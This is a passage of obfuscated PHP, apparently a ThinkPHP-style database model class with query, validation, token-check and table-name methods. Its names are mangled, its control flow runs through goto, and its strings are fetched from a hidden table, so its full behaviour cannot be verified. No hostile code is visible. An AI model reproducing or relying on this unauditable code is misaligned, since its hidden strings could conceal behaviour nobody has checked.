$E¿ŸÅË„‘í =& $_SERVER[Î¿—”òá]; $d·ÑÛè‡¢‘ = $this->_parseOptions($d·ÑÛè‡¢‘); return $E¿ŸÅË„‘í[265] . $this->db->buildSelectSql($d·ÑÛè‡¢‘) . $E¿ŸÅË„‘í[266]; } public function optionsValue($fË’é¡¨¾æ = null) { if (is_null($fË’é¡¨¾æ)) { return $this->options; } elseif (is_array($fË’é¡¨¾æ)) { $this->options = array_merge($this->options, $fË’é¡¨¾æ); } } protected function _parseOptions($B˜¶Ñ×Õ¦Î = array()) { goto DÍËò®¦ÖÉ; DÍËò®¦ÖÉ: $A–òÊ÷¸Š =& $_SERVER[Î¿—”òá]; if (is_array($B˜¶Ñ×Õ¦Î)) { $B˜¶Ñ×Õ¦Î = array_merge($this->options, $B˜¶Ñ×Õ¦Î); } $this->options = array(); goto B­Š¤‘Àø; Aº–ºˆª¿°: if (isset($B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[263]]) && is_array($B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[263]]) && !empty($cñ¸â›‰”‘) && !isset($B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[270]]) && !isset($B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[267]])) { foreach ($B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[263]] as $CŒÒ¸Ç’ğé => $fìâ‘Ã¢Û) { $CŒÒ¸Ç’ğé = trim($CŒÒ¸Ç’ğé); if (in_array($CŒÒ¸Ç’ğé, $cñ¸â›‰”‘, !0)) { if (is_scalar($fìâ‘Ã¢Û)) { $this->_parseType($B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[263]], $CŒÒ¸Ç’ğé); } } elseif (!is_numeric($CŒÒ¸Ç’ğé) && $A–òÊ÷¸Š[70] != substr($CŒÒ¸Ç’ğé, 0, 1) && !1 === strpos($CŒÒ¸Ç’ğé, $A–òÊ÷¸Š[91]) && !1 === strpos($CŒÒ¸Ç’ğé, $A–òÊ÷¸Š[248]) && !1 === strpos($CŒÒ¸Ç’ğé, $A–òÊ÷¸Š[271]) && !1 === strpos($CŒÒ¸Ç’ğé, $A–òÊ÷¸Š[272])) { unset($B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[263]][$CŒÒ¸Ç’ğé]); } } } $this->_options_filter($B˜¶Ñ×Õ¦Î); return $B˜¶Ñ×Õ¦Î; goto C¥¿£ˆºä; B­Š¤‘Àø: if (!isset($B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[267]])) { $B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[267]] = $this->getTableName(); $cñ¸â›‰”‘ = $this->fields; } else { $cñ¸â›‰”‘ = $this->getDbFields(); } if (!empty($B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[268]])) { $B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[267]] .= $A–òÊ÷¸Š[50] . $B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[268]]; } $B˜¶Ñ×Õ¦Î[$A–òÊ÷¸Š[269]] = $this->name; goto Aº–ºˆª¿°; C¥¿£ˆºä: } protected function _options_filter(&$DÛáãâŠÆƒ) { } protected function _parseType(&$eØÁ°²Š, $F„íÊ§é) { $e”ùùÁº´ğ =& $_SERVER[Î¿—”òá]; if (empty($this->options[$e”ùùÁº´ğ[273]][$e”ùùÁº´ğ[4] . $F„íÊ§é])) { $F•øßŠÛ¦› = strtolower($this->fields[$e”ùùÁº´ğ[240]][$F„íÊ§é]); if (!1 !== strpos($F•øßŠÛ¦›, $e”ùùÁº´ğ[274])) { } elseif (!1 === strpos($F•øßŠÛ¦›, $e”ùùÁº´ğ[275]) && !1 !== strpos($F•øßŠÛ¦›, $e”ùùÁº´ğ[276])) { $eØÁ°²Š[$F„íÊ§é] = intval($eØÁ°²Š[$F„íÊ§é]); } elseif (!1 !== strpos($F•øßŠÛ¦›, $e”ùùÁº´ğ[277]) || !1 !== strpos($F•øßŠÛ¦›, $e”ùùÁº´ğ[278])) { $eØÁ°²Š[$F„íÊ§é] = floatval($eØÁ°²Š[$F„íÊ§é]); } elseif (!1 !== strpos($F•øßŠÛ¦›, $e”ùùÁº´ğ[279])) { $eØÁ°²Š[$F„íÊ§é] = (bool) $eØÁ°²Š[$F„íÊ§é]; } } } public function find($C§Ã¼ò”¹ì = array()) { goto AƒÑğßÄîÄ; AƒÑğßÄîÄ: $bÂØ×ÆÂª =& $_SERVER[Î¿—”òá]; if (is_numeric($C§Ã¼ò”¹ì) || is_string($C§Ã¼ò”¹ì)) { $Aæ¨›¥­İñ[$this->getPk()] = intval($C§Ã¼ò”¹ì); $this->options[$bÂØ×ÆÂª[263]] = $Aæ¨›¥­İñ; } $this->options[$bÂØ×ÆÂª[280]] = 1; goto bº×†îÁò’; bº×†îÁò’: $C§Ã¼ò”¹ì = $this->_parseOptions(); $BØÊ¿®§¯ã = $this->db->select($C§Ã¼ò”¹ì); if (!1 === $BØÊ¿®§¯ã) { return !1; } goto a•«æÒ¡‚ã; f§’œ: if (!empty($this->options[$bÂØ×ÆÂª[281]])) { return $this->returnResult($this->data, $this->options[$bÂØ×ÆÂª[281]]); } return $this->data; goto cÏËœ¯æÃ‰; a•«æÒ¡‚ã: if (empty($BØÊ¿®§¯ã)) { return null; } $this->data = $BØÊ¿®§¯ã[0]; $this->_afterFind($this->data, $C§Ã¼ò”¹ì); goto f§’œ; cÏËœ¯æÃ‰: } protected function _afterFind(&$d²¿›‹‰®ö, $Få£»¼ Ğç) { } protected function returnResult($CÀ½‰àßŒí, $a¸ÈØŒ©ÖÑ = '') { $c¯ãòŞÔß˜ =& $_SERVER[Î¿—”òá]; if ($a¸ÈØŒ©ÖÑ) { if (is_callable($a¸ÈØŒ©ÖÑ)) { return call_user_func($a¸ÈØŒ©ÖÑ, $CÀ½‰àßŒí); } switch (strtolower($a¸ÈØŒ©ÖÑ)) { case $c¯ãòŞÔß˜[282]: return json_encode($CÀ½‰àßŒí); case $c¯ãòŞÔß˜[283]: return xml_encode($CÀ½‰àßŒí); } } return $CÀ½‰àßŒí; } public function parseFieldsMap($Dù³Ô›Â©ä, $DÁÆŠ¶®³  = 1) { if (!empty($this->_map)) { foreach ($this->_map as $c›„ŒŠ…öÉ => $b­µ©ò˜ßö) { if ($DÁÆŠ¶®³  == 1) { if (isset($Dù³Ô›Â©ä[$b­µ©ò˜ßö])) { $Dù³Ô›Â©ä[$c›„ŒŠ…öÉ] = $Dù³Ô›Â©ä[$b­µ©ò˜ßö]; unset($Dù³Ô›Â©ä[$b­µ©ò˜ßö]); } } else { if (isset($Dù³Ô›Â©ä[$c›„ŒŠ…öÉ])) { $Dù³Ô›Â©ä[$b­µ©ò˜ßö] = $Dù³Ô›Â©ä[$c›„ŒŠ…öÉ]; unset($Dù³Ô›Â©ä[$c›„ŒŠ…öÉ]); } } } } return $Dù³Ô›Â©ä; } public function setField($E¢¨…Í¡ ç, $Fâ¹éì½Šó = '') { if (is_array($E¢¨…Í¡ ç)) { $c¦Æ–„ˆ™â = $E¢¨…Í¡ ç; } else { $c¦Æ–„ˆ™â[$E¢¨…Í¡ ç] = $Fâ¹éì½Šó; } return $this->save($c¦Æ–„ˆ™â); } public function setAdd($cš†—‡´Ç•, $F‚ˆÁ†Ã = 1) { $b‘ŠÒÒ§·È =& $_SERVER[Î¿—”òá]; $C¨Õùá˜è¾ = $cš†—‡´Ç• . $b‘ŠÒÒ§·È[284] . $F‚ˆÁ†Ã; if ($F‚ˆÁ†Ã < 0) { $C¨Õùá˜è¾ = $cš†—‡´Ç• . $F‚ˆÁ†Ã; } return $this->setField($cš†—‡´Ç•, array($b‘ŠÒÒ§·È[285], $C¨Õùá˜è¾)); } public function getField($F¿ˆ©–„¾Ô, $Bö‰š‰ñÇ = null) { $FèŞÁ´‹† =& $_SERVER[Î¿—”òá]; $F‡ÎèçÇ¤[$FèŞÁ´‹†[261]] = $F¿ˆ©–„¾Ô; $F‡ÎèçÇ¤ = $this->_parseOptions($F‡ÎèçÇ¤); $F¿ˆ©–„¾Ô = trim($F¿ˆ©–„¾Ô); if (strpos($F¿ˆ©–„¾Ô, $FèŞÁ´‹†[47])) { if (!isset($F‡ÎèçÇ¤[$FèŞÁ´‹†[280]])) { $F‡ÎèçÇ¤[$FèŞÁ´‹†[280]] = is_numeric($Bö‰š‰ñÇ) ? $Bö‰š‰ñÇ : $FèŞÁ´‹†[33]; } $Fö¾Ş©°ñâ = $this->db->select($F‡ÎèçÇ¤); if (!empty($Fö¾Ş©°ñâ)) { goto BêõÀŸŠ†Ú; Cî‰ÂÆÈØ¿: foreach ($Fö¾Ş©°ñâ as $c‰«æ„µØ) { $b‚ÑĞÒÛË¶ = $c‰«æ„µØ[$aĞ´†•ùòŠ]; if (2 == $EŒŠÈËŒñ) { $c‰Ü×Èëî¿[$b‚ÑĞÒÛË¶] = $c‰«æ„µØ[$aİˆ²Ï•ÖÙ]; } else { $c‰Ü×Èëî¿[$b‚ÑĞÒÛË¶] = is_string($Bö‰š‰ñÇ) ? implode($Bö‰š‰ñÇ, $c‰«æ„µØ) : $c‰«æ„µØ; } } return $c‰Ü×Èëî¿; goto cÖ™ëš¿‰¹; BêõÀŸŠ†Ú: $AÅ÷ö´åí = explode($FèŞÁ´‹†[47], $F¿ˆ©–„¾Ô); $F¿ˆ©–„¾Ô = array_keys($Fö¾Ş©°ñâ[0]); $aĞ´†•ùòŠ = array_shift($F¿ˆ©–„¾Ô); goto FêéĞà¸Çë; FêéĞà¸Çë: $aİˆ²Ï•ÖÙ = array_shift($F¿ˆ©–„¾Ô); $c‰Ü×Èëî¿ = array(); $EŒŠÈËŒñ = count($AÅ÷ö´åí); goto Cî‰ÂÆÈØ¿; cÖ™ëš¿‰¹: } } else { if (!0 !== $Bö‰š‰ñÇ) { $F‡ÎèçÇ¤[$FèŞÁ´‹†[280]] = is_numeric($Bö‰š‰ñÇ) ? $Bö‰š‰ñÇ : 1; } if ($Bö‰š‰ñÇ === $FèŞÁ´‹†[243]) { unset($F‡ÎèçÇ¤[$FèŞÁ´‹†[280]]); } $c‰«æ„µØ = $this->db->select($F‡ÎèçÇ¤); if (!empty($c‰«æ„µØ)) { if ($Bö‰š‰ñÇ === $FèŞÁ´‹†[243]) { return reset($c‰«æ„µØ[0]); } if (!0 !== $Bö‰š‰ñÇ && 1 == $F‡ÎèçÇ¤[$FèŞÁ´‹†[280]]) { return reset($c‰«æ„µØ[0]); } foreach ($c‰«æ„µØ as $b‰Óâõ¹‹) { $DòËÈ–æ«ç[] = $b‰Óâõ¹‹[$F¿ˆ©–„¾Ô]; } return $DòËÈ–æ«ç; } } return null; } public function create($d˜Â°—Ìê = '', $E‘ÆïÆˆõÊ = '') { goto F…ÀŒÌã¹; f¨»Ö«ğ¨: if ($this->autoCheckFields) { $F¼Ü±††¸ê = $this->getDbFields(); foreach ($d˜Â°—Ìê as $EÈ…‚ÊÔ¿ => $D™÷§ó£‡) { if (!in_array($EÈ…‚ÊÔ¿, $F¼Ü±††¸ê)) { unset($d˜Â°—Ìê[$EÈ…‚ÊÔ¿]); } elseif (MAGIC_QUOTES_GPC && is_string($D™÷§ó£‡)) { $d˜Â°—Ìê[$EÈ…‚ÊÔ¿] = stripslashes($D™÷§ó£‡); } } } $this->autoOperation($d˜Â°—Ìê, $E‘ÆïÆˆõÊ); $this->data = $d˜Â°—Ìê; goto a×Û™²¥Š; F…ÀŒÌã¹: $DãÜîÌ¤Õ =& $_SERVER[Î¿—”òá]; if (empty($d˜Â°—Ìê)) { $d˜Â°—Ìê = $_POST; } elseif (is_object($d˜Â°—Ìê)) { $d˜Â°—Ìê = get_object_vars($d˜Â°—Ìê); } if (empty($d˜Â°—Ìê) || !is_array($d˜Â°—Ìê)) { $this->error = think_lang($DãÜîÌ¤Õ[259]); return !1; } goto c°ñÕÎ–; c°ñÕÎ–: $d˜Â°—Ìê = $this->parseFieldsMap($d˜Â°—Ìê, 0); $E‘ÆïÆˆõÊ = $E‘ÆïÆˆõÊ ? $E‘ÆïÆˆõÊ : (!empty($d˜Â°—Ìê[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$DãÜîÌ¤Õ[261]])) { $F¼Ü±††¸ê = $this->options[$DãÜîÌ¤Õ[261]]; unset($this->options[$DãÜîÌ¤Õ[261]]); } elseif ($E‘ÆïÆˆõÊ == THINK_MODEL_INSERT && isset($this->insertFields)) { $F¼Ü±††¸ê = $this->insertFields; } elseif ($E‘ÆïÆˆõÊ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $F¼Ü±††¸ê = $this->updateFields; } goto aÀŠáƒº¿®; aÀŠáƒº¿®: if (isset($F¼Ü±††¸ê)) { if (is_string($F¼Ü±††¸ê)) { $F¼Ü±††¸ê = explode($DãÜîÌ¤Õ[47], $F¼Ü±††¸ê); } if (think_config($DãÜîÌ¤Õ[286])) { $F¼Ü±††¸ê[] = think_config($DãÜîÌ¤Õ[287]); } foreach ($d˜Â°—Ìê as $EÈ…‚ÊÔ¿ => $D™÷§ó£‡) { if (!in_array($EÈ…‚ÊÔ¿, $F¼Ü±††¸ê)) { unset($d˜Â°—Ìê[$EÈ…‚ÊÔ¿]); } } } if (!$this->autoValidation($d˜Â°—Ìê, $E‘ÆïÆˆõÊ)) { return !1; } if (!$this->autoCheckToken($d˜Â°—Ìê)) { $this->error = think_lang($DãÜîÌ¤Õ[288]); return !1; } goto f¨»Ö«ğ¨; a×Û™²¥Š: return $d˜Â°—Ìê; goto AºÅÖï²³¶; AºÅÖï²³¶: } public function autoCheckToken($cöÅ‡©ßÈí) { $bñÇÂñ³‡ =& $_SERVER[Î¿—”òá]; if (isset($this->options[$bñÇÂñ³‡[289]]) && !$this->options[$bñÇÂñ³‡[289]]) { return !0; } if (think_config($bñÇÂñ³‡[286])) { $Cö°Ãò™ŞŠ = think_config($bñÇÂñ³‡[287]); if (!isset($cöÅ‡©ßÈí[$Cö°Ãò™ŞŠ]) || Session::get($Cö°Ãò™ŞŠ)) { return !1; } list($D„ä‡š”â, $dºö¾ù±¦ß) = explode($bñÇÂñ³‡[70], $cöÅ‡©ßÈí[$Cö°Ãò™ŞŠ]); if ($dºö¾ù±¦ß && Session::get($Cö°Ãò™ŞŠ . $bñÇÂñ³‡[91] . $D„ä‡š”â) === $dºö¾ù±¦ß) { Session::remove($Cö°Ãò™ŞŠ . $bñÇÂñ³‡[91] . $D„ä‡š”â); return !0; } if (think_config($bñÇÂñ³‡[290])) { Session::remove($Cö°Ãò™ŞŠ . $bñÇÂñ³‡[91] . $D„ä‡š”â); } return !1; } return !0; } public function regex($f÷±Ò²¾Ú, $B†§Õî²¥£) { $B§è²ë“¬ =& $_SERVER[Î¿—”òá]; $Dˆö“ èç± = array($B§è²ë“¬[291] => $B§è²ë“¬[292], $B§è²ë“¬[293] => $B§è²ë“¬[294], $B§è²ë“¬[295] => $B§è²ë“¬[296], $B§è²ë“¬[297] => $B§è²ë“¬[298], $B§è²ë“¬[299] => $B§è²ë“¬[300], $B§è²ë“¬[301] => $B§è²ë“¬[302], $B§è²ë“¬[303] => $B§è²ë“¬[304], $B§è²ë“¬[278] => $B§è²ë“¬[305], $B§è²ë“¬[306] => $B§è²ë“¬[307]); if (isset($Dˆö“ èç±[strtolower($B†§Õî²¥£)])) { $B†§Õî²¥£ = $Dˆö“ èç±[strtolower($B†§Õî²¥£)]; } return preg_match($B†§Õî²¥£, $f÷±Ò²¾Ú) === 1; } private function autoOperation(&$Eùºó²ƒ, $cÏõ„‹õÇØ) { $E‹Ç‚ÍÑÜ =& $_SERVER[Î¿—”òá]; if (!empty($this->options[$E‹Ç‚ÍÑÜ[308]])) { $fª§ÌÒÈ¬¡ = $this->options[$E‹Ç‚ÍÑÜ[308]]; unset($this->options[$E‹Ç‚ÍÑÜ[308]]); } elseif (!empty($this->_auto)) { $fª§ÌÒÈ¬¡ = $this->_auto; } if (isset($fª§ÌÒÈ¬¡)) { foreach ($fª§ÌÒÈ¬¡ as $Cë½Èš¼ÓÏ) { if (empty($Cë½Èš¼ÓÏ[2])) { $Cë½Èš¼ÓÏ[2] = THINK_MODEL_INSERT; } if ($cÏõ„‹õÇØ == $Cë½Èš¼ÓÏ[2] || $Cë½Èš¼ÓÏ[2] == THINK_MODEL_BOTH) { switch (trim($Cë½Èš¼ÓÏ[3])) { case $E‹Ç‚ÍÑÜ[309]: case $E‹Ç‚ÍÑÜ[310]: $cöíç”‘ = isset($Cë½Èš¼ÓÏ[4]) ? (array) $Cë½Èš¼ÓÏ[4] : array(); if (isset($Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]])) { array_unshift($cöíç”‘, $Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]]); } if ($E‹Ç‚ÍÑÜ[309] == $Cë½Èš¼ÓÏ[3]) { $Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]] = call_user_func_array($Cë½Èš¼ÓÏ[1], $cöíç”‘); } else { $Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]] = call_user_func_array(array(&$this, $Cë½Èš¼ÓÏ[1]), $cöíç”‘); } break; case $E‹Ç‚ÍÑÜ[261]: $Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]] = $Eùºó²ƒ[$Cë½Èš¼ÓÏ[1]]; break; case $E‹Ç‚ÍÑÜ[311]: if ($E‹Ç‚ÍÑÜ[33] === $Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]]) { unset($Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]]); } break; case $E‹Ç‚ÍÑÜ[312]: default: $Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]] = $Cë½Èš¼ÓÏ[1]; } if (!1 === $Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]]) { unset($Eùºó²ƒ[$Cë½Èš¼ÓÏ[0]]); } } } } return $Eùºó²ƒ; } protected function autoValidation($Déíë„ø¯, $FŠ×œ¤»™ã) { $CœòåÎ‹øš =& $_SERVER[Î¿—”òá]; if (!empty($this->options[$CœòåÎ‹øš[313]])) { $dªõ·¸Á¡á = $this->options[$CœòåÎ‹øš[313]]; unset($this->options[$CœòåÎ‹øš[313]]); } elseif (!empty($this->_validate)) { $dªõ·¸Á¡á = $this->_validate; } if (isset($dªõ·¸Á¡á)) { if ($this->patchValidate) { $this->error = array(); } foreach ($dªõ·¸Á¡á as $dè‰ÃÏŒ° => $Aªà‡í­Ú ) { if (empty($Aªà‡í­Ú [5]) || $Aªà‡í­Ú [5] == THINK_MODEL_BOTH || $Aªà‡í­Ú [5] == $FŠ×œ¤»™ã) { if (0 == strpos($Aªà‡í­Ú [2], $CœòåÎ‹øš[314]) && strpos($Aªà‡í­Ú [2], $CœòåÎ‹øš[315])) { $Aªà‡í­Ú [2] = think_lang(substr($Aªà‡í­Ú [2], 2, -1)); } $Aªà‡í­Ú [3] = isset($Aªà‡í­Ú [3]) ? $Aªà‡í­Ú [3] : THINK_EXISTS_VALIDATE; $Aªà‡í­Ú [4] = isset($Aªà‡í­Ú [4]) ? $Aªà‡í­Ú [4] : $CœòåÎ‹øš[316]; switch ($Aªà‡í­Ú [3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Déíë„ø¯, $Aªà‡í­Ú )) { return !1; } break; case THINK_VALUE_VALIDATE: if ($CœòåÎ‹øš[33] != trim($Déíë„ø¯[$Aªà‡í­Ú [0]])) { if (!1 === $this->_validationField($Déíë„ø¯, $Aªà‡í­Ú )) { return !1; } } break; default: if (isset($Déíë„ø¯[$Aªà‡í­Ú [0]])) { if (!1 === $this->_validationField($Déíë„ø¯, $Aªà‡í­Ú )) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($B†°ò••‡, $e¼²óë³¾¾) { if (!1 === $this->_validationFieldItem($B†°ò••‡, $e¼²óë³¾¾)) { if ($this->patchValidate) { $this->error[$e¼²óë³¾¾[0]] = $e¼²óë³¾¾[2]; } else { $this->error = $e¼²óë³¾¾[2]; return !1; } } return; } protected function _validationFieldItem($C¸³ø¬î±, $dŒñø©¢Ã¶) { $e·Œå® =& $_SERVER[Î¿—”òá]; switch (strtolower(trim($dŒñø©¢Ã¶[4]))) { case $e·Œå®[309]: case $e·Œå®[310]: $D»ï²è³£‹ = isset($dŒñø©¢Ã¶[6]) ? (array) $dŒñø©¢Ã¶[6] : array(); if (is_string($dŒñø©¢Ã¶[0]) && strpos($dŒñø©¢Ã¶[0], $e·Œå®[47])) { $dŒñø©¢Ã¶[0] = explode($e·Œå®[47], $dŒñø©¢Ã¶[0]); } if (is_array($dŒñø©¢Ã¶[0])) { foreach ($dŒñø©¢Ã¶[0] as $E×š÷Ïù†Ç) { $A¿œº¨­—[$E×š÷Ïù†Ç] = $C¸³ø¬î±[$E×š÷Ïù†Ç]; } array_unshift($D»ï²è³£‹, $A¿œº¨­—); } else { array_unshift($D»ï²è³£‹, $C¸³ø¬î±[$dŒñø©¢Ã¶[0]]); } if ($e·Œå®[309] == $dŒñø©¢Ã¶[4]) { return call_user_func_array($dŒñø©¢Ã¶[1], $D»ï²è³£‹); } else { return call_user_func_array(array(&$this, $dŒñø©¢Ã¶[1]), $D»ï²è³£‹); } case $e·Œå®[317]: return $C¸³ø¬î±[$dŒñø©¢Ã¶[0]] == $C¸³ø¬î±[$dŒñø©¢Ã¶[1]]; case $e·Œå®[318]: if (is_string($dŒñø©¢Ã¶[0]) && strpos($dŒñø©¢Ã¶[0], $e·Œå®[47])) { $dŒñø©¢Ã¶[0] = explode($e·Œå®[47], $dŒñø©¢Ã¶[0]); } $cÆ•–öƒÏ„ = array(); if (is_array($dŒñø©¢Ã¶[0])) { foreach ($dŒñø©¢Ã¶[0] as $E×š÷Ïù†Ç) { $cÆ•–öƒÏ„[$E×š÷Ïù†Ç] = $C¸³ø¬î±[$E×š÷Ïù†Ç]; } } else { $cÆ•–öƒÏ„[$dŒñø©¢Ã¶[0]] = $C¸³ø¬î±[$dŒñø©¢Ã¶[0]]; } if (!empty($C¸³ø¬î±[$this->getPk()])) { $cÆ•–öƒÏ„[$this->getPk()] = array($e·Œå®[319], $C¸³ø¬î±[$this->getPk()]); } if ($this->where($cÆ•–öƒÏ„)->find()) { return !1; } return !0; default: return $this->check($C¸³ø¬î±[$dŒñø©¢Ã¶[0]], $dŒñø©¢Ã¶[1], $dŒñø©¢Ã¶[4]); } } public function check($Fš³¹©ß½ä, $BµˆÁå÷®ß, $F§¬Ç·òñ = "\162\145\147\145\170") { $d½“Šê’¨ =& $_SERVER[Î¿—”òá]; $F§¬Ç·òñ = strtolower(trim($F§¬Ç·òñ)); switch ($F§¬Ç·òñ) { case $d½“Šê’¨[7]: case $d½“Šê’¨[320]: $cÜË—İ¼…‚ = is_array($BµˆÁå÷®ß) ? $BµˆÁå÷®ß : explode($d½“Šê’¨[47], $BµˆÁå÷®ß); return $F§¬Ç·òñ == $d½“Šê’¨[7] ? in_array($Fš³¹©ß½ä, $cÜË—İ¼…‚) : !in_array($Fš³¹©ß½ä, $cÜË—İ¼…‚); case $d½“Šê’¨[321]: case $d½“Šê’¨[322]: if (is_array($BµˆÁå÷®ß)) { $d¾é–éÆè = $BµˆÁå÷®ß[0]; $c±Ş¯ŞÃä = $BµˆÁå÷®ß[1]; } else { list($d¾é–éÆè, $c±Ş¯ŞÃä) = explode($d½“Šê’¨[47], $BµˆÁå÷®ß); } return $F§¬Ç·òñ == $d½“Šê’¨[321] ? $Fš³¹©ß½ä >= $d¾é–éÆè && $Fš³¹©ß½ä <= $c±Ş¯ŞÃä : $Fš³¹©ß½ä < $d¾é–éÆè || $Fš³¹©ß½ä > $c±Ş¯ŞÃä; case $d½“Šê’¨[323]: case $d½“Šê’¨[324]: return $F§¬Ç·òñ == $d½“Šê’¨[323] ? $Fš³¹©ß½ä == $BµˆÁå÷®ß : $Fš³¹©ß½ä != $BµˆÁå÷®ß; case $d½“Šê’¨[325]: $bÛŸŞ×Ÿ’ = mb_strlen($Fš³¹©ß½ä, $d½“Šê’¨[326]); if (strpos($BµˆÁå÷®ß, $d½“Šê’¨[47])) { list($d¾é–éÆè, $c±Ş¯ŞÃä) = explode($d½“Šê’¨[47], $BµˆÁå÷®ß); return $bÛŸŞ×Ÿ’ >= $d¾é–éÆè && $bÛŸŞ×Ÿ’ <= $c±Ş¯ŞÃä; } else { return $bÛŸŞ×Ÿ’ == $BµˆÁå÷®ß; } case $d½“Šê’¨[327]: list($Eƒô¤í³, $F¿È–Íˆğø) = explode($d½“Šê’¨[47], $BµˆÁå÷®ß); if (!is_numeric($Eƒô¤í³)) { $Eƒô¤í³ = strtotime($Eƒô¤í³); } if (!is_numeric($F¿È–Íˆğø)) { $F¿È–Íˆğø = strtotime($F¿È–Íˆğø); } return NOW_TIME >= $Eƒô¤í³ && NOW_TIME <= $F¿È–Íˆğø; case $d½“Šê’¨[328]: return in_array(get_client_ip(), explode($d½“Šê’¨[47], $BµˆÁå÷®ß)); case $d½“Šê’¨[329]: return !in_array(get_client_ip(), explode($d½“Šê’¨[47], $BµˆÁå÷®ß)); case $d½“Šê’¨[316]: default: return $this->regex($Fš³¹©ß½ä, $BµˆÁå÷®ß); } } public function query($e¦‹à–ìƒ†, $FæÛÒ…Â… = false) { $AÓÂ¡®‹ =& $_SERVER[Î¿—”òá]; if (!is_bool($FæÛÒ…Â…) && !is_array($FæÛÒ…Â…)) { $FæÛÒ…Â… = func_get_args(); array_shift($FæÛÒ…Â…); } $e¦‹à–ìƒ† = str_replace(array($AÓÂ¡®‹[217], $AÓÂ¡®‹[330]), $AÓÂ¡®‹[50], $e¦‹à–ìƒ†); $e¦‹à–ìƒ† = $this->parseSql($e¦‹à–ìƒ†, $FæÛÒ…Â…); return $this->db->query($e¦‹à–ìƒ†); } public function execute($c°´ğ¸Ùø², $F‚¾÷¶Ü™à = false) { if (!is_bool($F‚¾÷¶Ü™à) && !is_array($F‚¾÷¶Ü™à)) { $F‚¾÷¶Ü™à = func_get_args(); array_shift($F‚¾÷¶Ü™à); } $c°´ğ¸Ùø² = $this->parseSql($c°´ğ¸Ùø², $F‚¾÷¶Ü™à); return $this->db->execute($c°´ğ¸Ùø²); } protected function parseSql($aäÈŸ¨È¥, $f¡²¾°ª³›) { $cù¾²£¯ëî =& $_SERVER[Î¿—”òá]; if (!0 === $f¡²¾°ª³›) { $b¯ŒÕ ˆ = $this->_parseOptions(); $aäÈŸ¨È¥ = $this->db->parseSql($aäÈŸ¨È¥, $b¯ŒÕ ˆ); } elseif (is_array($f¡²¾°ª³›)) { $f¡²¾°ª³› = array_map(array($this->db, $cù¾²£¯ëî[331]), $f¡²¾°ª³›); $aäÈŸ¨È¥ = vsprintf($aäÈŸ¨È¥, $f¡²¾°ª³›); } else { $aäÈŸ¨È¥ = strtr($aäÈŸ¨È¥, array($cù¾²£¯ëî[332] => $this->getTableName(), $cù¾²£¯ëî[333] => think_config($cù¾²£¯ëî[232]))); } $this->db->setModel($this->name); return $aäÈŸ¨È¥; } public function db($Céß£…¢Çƒ = '', $fÚ÷œÉá = '', $D¤îñß¦ë = array()) { goto cÏ‹§¢é²ù; BœÛ¼‚Â·: static $EÁçëº—«è = array(); if (!isset($EÁçëº—«è[$Céß£…¢Çƒ]) || isset($EÁçëº—«è[$Céß£…¢Çƒ]) && $fÚ÷œÉá && $AÄßŠ¥ŞÔ[$Céß£…¢Çƒ] != $fÚ÷œÉá) { if (!empty($fÚ÷œÉá) && is_string($fÚ÷œÉá) && !1 === strpos($fÚ÷œÉá, $bÙ«î®ÑØŒ[8])) { $fÚ÷œÉá = think_config($fÚ÷œÉá); } $EÁçëº—«è[$Céß£…¢Çƒ] = Db::getInstance($fÚ÷œÉá); } elseif (NULL === $fÚ÷œÉá) { $EÁçëº—«è[$Céß£…¢Çƒ]->close(); unset($EÁçëº—«è[$Céß£…¢Çƒ]); return; } if (!empty($D¤îñß¦ë)) { if (is_string($D¤îñß¦ë)) { parse_str($D¤îñß¦ë, $D¤îñß¦ë); } foreach ($D¤îñß¦ë as $dß‰¯†Äö => $cô¸èÆÎÇ‰) { $this->setProperty($dß‰¯†Äö, $cô¸èÆÎÇ‰); } } goto dá­êĞÀ¾Ÿ; f«’Ã£¿‘÷: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto b«­æÕ¶Š; cÏ‹§¢é²ù: $bÙ«î®ÑØŒ =& $_SERVER[Î¿—”òá]; if ($bÙ«î®ÑØŒ[33] === $Céß£…¢Çƒ && $this->db) { return $this->db; } static $AÄßŠ¥ŞÔ = array(); goto BœÛ¼‚Â·; dá­êĞÀ¾Ÿ: $AÄßŠ¥ŞÔ[$Céß£…¢Çƒ] = $fÚ÷œÉá; $this->db = $EÁçëº—«è[$Céß£…¢Çƒ]; $this->_after_db(); goto f«’Ã£¿‘÷; b«­æÕ¶Š: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $c’‰¦Û¿Â„ = get_class($this); if ($c’‰¦Û¿Â„ == $_SERVER[Î¿—”òá][334]) { return $this->name; } $this->name = substr($c’‰¦Û¿Â„, 0, -5); } return $this->name; } public function getTableName() { $eëà¡æ‚ŒÊ =& $_SERVER[Î¿—”òá]; if (empty($this->trueTableName)) { $CÊËœåõ¬ = !empty($this->tablePrefix) ? $this->tablePrefix : $eëà¡æ‚ŒÊ[33]; if (!empty($this->tableName)) { $CÊËœåõ¬ .= $this->tableName; } else { $CÊËœåõ¬ .= think_parse_name($this->name); } $this->trueTableName = strtolower($CÊËœåõ¬); } return (!empty($this->dbName) ? $this->dbName . $eëà¡æ‚ŒÊ[91] : $eëà¡æ‚ŒÊ[33]) . $this->trueTableName; } public function startTrans() 